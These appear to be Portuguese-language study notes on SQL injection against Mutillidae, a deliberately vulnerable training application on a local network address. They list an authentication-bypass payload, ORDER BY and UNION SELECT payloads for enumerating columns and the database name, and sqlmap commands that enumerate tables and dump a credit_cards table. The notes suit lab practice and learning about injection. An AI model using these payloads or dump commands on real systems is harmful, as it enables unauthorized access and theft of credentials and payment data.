<h1>SLQ Injection</h1>

-- Inserir código sql em inputs
	
	1° Primeiro passo: Forçar erro para ver no log a consulta SQL
		"SELECT * FROM accounts WHERE username='admin '' AND password='' (0) [Exception] "

	2° Tentar concatenar uma condição afim de conseguir logar no sistema
		SELECT * FROM accounts WHERE username='admin' AND password='
									    x' or '1'='1   
											'
	  Assim conseguimos logar com sucesso.

	3° Tentar descobrir a quantidade de colunas que a tabela accounts possui, conseguimos isso com o código order by.
		**** admin' order by 1,2,3,4,5,6,7 -- 
	
	4° Com Union consigo unir dois selects, assim consigo acessar dados sensiveis do sistema
		
		Para usar o union :
			admin' union select 1,2,3,4,5,6,7 from information_schema.columns where table_name = 'accounts'  --  
			(Com esse comando consigo descobrir o nome das colunas')
		- Para descobrir o nome do banco de dados, basta adicionar database() ao comando acima, assim :
			admin' union select 1,database(),3,4,5,6,7 from information_schema.columns where table_name = 'accounts'  --  
			obtive o seguinte resultado "nowasp"
		- Com o nome do databse, conseguimos descobrir todas as colunas da tabela accounts:
			admin' union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name = 'accounts' and table_schema = 'nowasp' --  

	5° Usando SQLMAP 
		- Descobrir o banco 
			sqlmap -u "http://192.168.0.64/mutillidae/index.php?page=user-info.php&username=admin&password=afas&user-info-php-submit-button=View+Account+Details" --current-db
      
		- Descobrir as tabelas do banco 
			sqlmap -u "http://192.168.0.64/mutillidae/index.php?page=user-info.php&username=admin&password=afas&user-info-php-submit-button=View+Account+Details" --tables -D nowasp

		- Para descobrir dados de uma tabelas
			sqlmap -u "http://192.168.0.64/mutillidae/index.php?page=user-info.php&username=admin&password=afas&user-info-php-submit-button=View+Account+Details" --dump -T credit_cards -D nowasp

 



